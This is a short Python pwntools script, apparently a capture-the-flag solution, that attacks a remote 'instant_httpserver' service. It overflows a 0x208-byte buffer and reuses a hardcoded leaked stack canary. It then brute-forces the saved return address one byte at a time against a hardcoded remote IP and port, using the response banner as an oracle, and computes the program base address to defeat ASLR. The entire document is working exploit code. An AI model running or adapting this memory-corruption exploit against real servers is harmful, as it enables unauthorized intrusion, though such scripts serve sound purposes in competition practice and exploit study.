from pwn import *

import time


context.log_level = 'ERROR'

canary = 0x4bd371f7fd688900  # remote
# canary = 0x1fe454b9cd73fc00  # local

addr_target = b'\xe5'
while (len(addr_target) < 8):
    for ch in range(0xff):
        b = ch.to_bytes(1, 'little')
        print(hex(u64((addr_target+b).ljust(8, b'\x00'))))

        payload = b''
        payload += b'A' * 0x208
        payload += p64(canary)
        payload += p64(0xdeadbeeffeedbaad)  # old rbp
        payload += addr_target
        payload += b

        # io = remote('localhost', 4445)
        io = remote('114.177.250.4', 4445)
        io.send(payload)
        io.recvuntil(b'Server: instant_httpserver')
        time.sleep(0.1)
        data = io.recv()
        io.close()
        print(data)
        # break
        if (b'Server: instant_httpserver' in data):
            addr_target += b
            break

    print(hex(u64(addr_target.ljust(8, b'\x00'))))
    # break

addr_prog = u64(addr_target) - 0xde5
print("addr_prog = 0x{:x}".format(addr_prog))
